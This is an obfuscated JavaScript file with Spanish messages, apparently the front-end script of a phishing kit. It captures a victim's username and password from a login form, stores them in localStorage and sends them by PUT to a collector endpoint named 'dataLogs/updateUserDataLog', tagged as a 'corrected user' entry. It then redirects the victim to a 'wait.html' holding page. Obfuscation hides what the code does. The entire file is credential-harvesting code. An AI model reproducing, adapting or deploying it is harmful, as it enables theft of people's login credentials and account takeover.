function _0x4934(_0x99d4d1, _0x36f314) {
  const _0x3e2999 = _0x3e29();
  return (
    (_0x4934 = function (_0x49340a, _0x47031a) {
      _0x49340a = _0x49340a - 0x9e;
      let _0x40a38a = _0x3e2999[_0x49340a];
      return _0x40a38a;
    }),
    _0x4934(_0x99d4d1, _0x36f314)
  );
}
const _0x1d7285 = _0x4934;
(function (_0x43a42c, _0x25f3dd) {
  const _0x208e05 = _0x4934,
    _0x1e644d = _0x43a42c();
  while (!![]) {
    try {
      const _0x4fee87 =
        (parseInt(_0x208e05(0xc1)) / 0x1) * (parseInt(_0x208e05(0xa9)) / 0x2) +
        (parseInt(_0x208e05(0xae)) / 0x3) * (parseInt(_0x208e05(0xb3)) / 0x4) +
        parseInt(_0x208e05(0xc5)) / 0x5 +
        -parseInt(_0x208e05(0xa6)) / 0x6 +
        (-parseInt(_0x208e05(0xb5)) / 0x7) * (parseInt(_0x208e05(0xbc)) / 0x8) +
        (parseInt(_0x208e05(0xb2)) / 0x9) * (parseInt(_0x208e05(0xa8)) / 0xa) +
        -parseInt(_0x208e05(0xc3)) / 0xb;
      if (_0x4fee87 === _0x25f3dd) break;
      else _0x1e644d["push"](_0x1e644d["shift"]());
    } catch (_0x286188) {
      _0x1e644d["push"](_0x1e644d["shift"]());
    }
  }
})(_0x3e29, 0x5e99a);
function updateLS() {
  const _0x4a0c56 = _0x4934;
  LS[_0x4a0c56(0xbf)]("info", JSON[_0x4a0c56(0xc7)](info));
}
function _0x3e29() {
  const _0x5849f8 = [
    "Corrigió\x20Usuario",
    "preventDefault",
    "addEventListener",
    "application/json",
    "txtUsuario",
    "error",
    "getElementById",
    "Bearer\x20",
    "2470038TKLdcl",
    "dataLogId",
    "20lFDPmu",
    "903446sJlIUq",
    "wait.html",
    "getItem",
    "origin",
    "log",
    "489mGdiwX",
    "Usuario\x20actualizado\x20correctamente",
    "/dataLogs/updateUserDataLog/",
    "location",
    "1511091YdeERV",
    "7356DCRcEJ",
    "metaInfo",
    "3318mvPlNi",
    "disabled",
    "value",
    "PUT",
    "href",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "dataLogToken",
    "5024NyOrFt",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "user",
    "setItem",
    "txtPass",
    "1Eynexm",
    "Error\x20al\x20actualizar\x20usuario:",
    "5127144cuEjmU",
    "focus",
    "2378265rUOvDu",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "stringify",
  ];
  _0x3e29 = function () {
    return _0x5849f8;
  };
  return _0x3e29();
}
const button = document[_0x1d7285(0xa4)]("btnUsuario"),
  userInput = document[_0x1d7285(0xa4)](_0x1d7285(0xa2)),
  passInput = document[_0x1d7285(0xa4)](_0x1d7285(0xc0));
async function updateStatusUser() {
  const _0x186178 = _0x1d7285;
  button[_0x186178(0xb6)] = !![];
  try {
    const _0x3d5d12 = localStorage[_0x186178(0xab)](_0x186178(0xa7)),
      _0x39ff49 = localStorage[_0x186178(0xab)](_0x186178(0xbb));
    if (!_0x3d5d12 || !_0x39ff49)
      throw new Error(
        "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage."
      );
    const _0x2c55bb = await fetch(url + _0x186178(0xb0) + _0x3d5d12, {
      method: _0x186178(0xb8),
      headers: {
        "Content-Type": _0x186178(0xa1),
        Authorization: _0x186178(0xa5) + _0x39ff49,
        Origin: window[_0x186178(0xb1)][_0x186178(0xac)],
      },
      body: JSON[_0x186178(0xc7)]({
        us: info[_0x186178(0xb4)][_0x186178(0xbe)],
        ps: info["metaInfo"]["puser"],
        status: _0x186178(0x9e),
      }),
    });
    if (!_0x2c55bb["ok"]) {
      const _0xb6b9da = await _0x2c55bb["json"]();
      throw new Error(_0xb6b9da[_0x186178(0xa3)] || _0x186178(0xbd));
    }
    console[_0x186178(0xad)](_0x186178(0xaf)),
      (button["disabled"] = ![]),
      (window["location"][_0x186178(0xb9)] = _0x186178(0xaa));
  } catch (_0x3df7cf) {
    console["error"](_0x186178(0xc2), _0x3df7cf),
      alert(_0x186178(0xc6)),
      (button["disabled"] = ![]);
  }
}
button[_0x1d7285(0xa0)]("click", async function (_0x21bb4b) {
  const _0x2b0531 = _0x1d7285;
  _0x21bb4b[_0x2b0531(0x9f)]();
  if (userInput[_0x2b0531(0xb7)] == "" && passInput[_0x2b0531(0xb7)] == "") {
    alert(_0x2b0531(0xba)), userInput[_0x2b0531(0xc4)]();
    return;
  } else {
    const _0x136eee = userInput[_0x2b0531(0xb7)],
      _0x40cb0 = passInput[_0x2b0531(0xb7)];
    (info[_0x2b0531(0xb4)]["user"] = _0x136eee),
      (info[_0x2b0531(0xb4)]["puser"] = _0x40cb0),
      updateLS(),
      await updateStatusUser();
  }
});
